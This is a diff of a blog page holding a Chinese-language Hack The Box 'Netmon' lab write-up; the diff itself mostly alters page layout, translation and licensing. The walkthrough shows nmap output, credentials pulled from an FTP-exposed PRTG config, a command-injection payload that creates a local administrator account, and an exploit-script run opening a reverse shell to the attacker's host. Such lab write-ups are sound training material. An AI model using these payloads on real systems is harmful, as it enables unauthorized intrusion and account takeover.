@@ -118,8 +118,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -141,7 +148,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -212,34 +219,13 @@
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.10.152</span></span><br><span class="line">Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-06 12:49 CST</span><br><span class="line">Nmap scan report for 10.10.10.152</span><br><span class="line">Host is up (0.067s latency).</span><br><span class="line">Not shown: 995 closed ports</span><br><span class="line">PORT    STATE SERVICE      VERSION</span><br><span class="line">21/tcp  open  ftp          Microsoft ftpd</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| 02-02-19  11:18PM                 1024 .rnd</span><br><span class="line">| 02-25-19  09:15PM       &lt;DIR&gt;          inetpub</span><br><span class="line">| 07-16-16  08:18AM       &lt;DIR&gt;          PerfLogs</span><br><span class="line">| 02-25-19  09:56PM       &lt;DIR&gt;          Program Files</span><br><span class="line">| 02-02-19  11:28PM       &lt;DIR&gt;          Program Files (x86)</span><br><span class="line">| 02-03-19  07:08AM       &lt;DIR&gt;          Users</span><br><span class="line">|_02-25-19  10:49PM       &lt;DIR&gt;          Windows</span><br><span class="line">| ftp-syst:</span><br><span class="line">|_  SYST: Windows_NT</span><br><span class="line">80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)</span><br><span class="line">|_http-server-header: PRTG/18.1.37.13946</span><br><span class="line">| http-title: Welcome | PRTG Network Monitor (NETMON)</span><br><span class="line">|_Requested resource was /index.htm</span><br><span class="line">|_http-trane-info: Problem with XML parsing of /evox/about</span><br><span class="line">135/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span><br><span class="line">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2.02:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2020-11-06T04:49:53</span><br><span class="line">|_  start_date: 2020-11-05T06:38:30</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 27.25 seconds</span><br></pre></td></tr></table></figure>
 
 <h2 id="21-ftp"><a href="#21-ftp" class="headerlink" title="21 ftp"></a>21 ftp</h2><p>FTP可以匿名访问：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110601.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110601.jpg" alt=""></p>
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>80是PRTG Network Monitor 18.1.37.13946 ：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110602.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110602.jpg" alt=""></p>
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>user.txt在FTP里：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp:&#x2F;&#x2F;10.10.10.152&#x2F;Users&#x2F;Public&#x2F;</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110603.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110603.jpg" alt=""></p>
 <h1 id="PRTG-Network-Monitor"><a href="#PRTG-Network-Monitor" class="headerlink" title="PRTG Network Monitor"></a>PRTG Network Monitor</h1><p>在FTP里查看netmon的安装目录：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp:&#x2F;&#x2F;10.10.10.152&#x2F;Program%20Files%20(x86)&#x2F;PRTG%20Network%20Monitor&#x2F;</span><br></pre></td></tr></table></figure>
 
@@ -249,26 +235,12 @@
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp:&#x2F;&#x2F;10.10.10.152&#x2F;ProgramData&#x2F;Paessler&#x2F;PRTG%20Network%20Monitor&#x2F;</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110604.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110604.jpg" alt=""></p>
 <p>这个配置文件里得到一组账号密码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;dbpassword&gt;</span><br><span class="line">	      &lt;!-- User: prtgadmin --&gt;</span><br><span class="line">	      PrTg@dmin2018</span><br><span class="line">&lt;&#x2F;dbpassword&gt;</span><br></pre></td></tr></table></figure>
 
 <h1 id="prtgadmin"><a href="#prtgadmin" class="headerlink" title="prtgadmin"></a>prtgadmin</h1><p>然后可以去80登录，直接用这个密码是错误的，因为是老的配置文件，可以根据规则把密码改成<code>PrTg@dmin2019</code>(失败的话reset一下机器):</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110605.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110605.jpg" alt=""></p>
 <p>然后根据版本号，搜到一个漏洞：</p>
 <ul>
 <li>PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution - Windows webapps Exploit<br><a href="https://www.exploit-db.com/exploits/46527" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/46527</a></li>
@@ -278,23 +250,9 @@
 <p>Add new notification,在Execute Program那里注入命令：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abc.txt | net user miao abc123! &#x2F;add ; net localgroup administrators miao &#x2F;add</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110606.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110606.jpg" alt=""></p>
 <p>然后去点击触发：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110607.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110607.jpg" alt=""></p>
 <p>编码问题很容易导致失败(也可能是延迟问题，我用python打完后发现meterpreter那里弹回来一堆，都是之前测试的)，找到别人写的一个python：</p>
 <ul>
 <li>nullarmor | Netmon - Hack The Box<br><a href="https://nullarmor.github.io/posts/netmon" target="_blank" rel="noopener">https://nullarmor.github.io/posts/netmon</a></li>
@@ -302,16 +260,7 @@
 </ul>
 <p>一键打</p>
 <h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>直接exp打到system shell 读取root.txt:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110608.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110608.jpg" alt=""></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python netmon.py --rhost http://10.10.10.152 --username prtgadmin --password PrTg@dmin2019 --lhost 10.10.14.7 --lport 4447</span><br><span class="line"></span><br><span class="line">type C:\Users\Administrator\Desktop\root.txt</span><br></pre></td></tr></table></figure>
 
 
@@ -332,7 +281,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2020-11-06T06:30:30.025Z" itemprop="dateUpdated">2020-11-06 14:30:30</time>
+    Last updated: <time datetime="2020-11-06T06:30:30.025Z" itemprop="dateUpdated">2020-11-06 14:30:30</time>
 </span><br>
 
 
@@ -499,11 +448,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
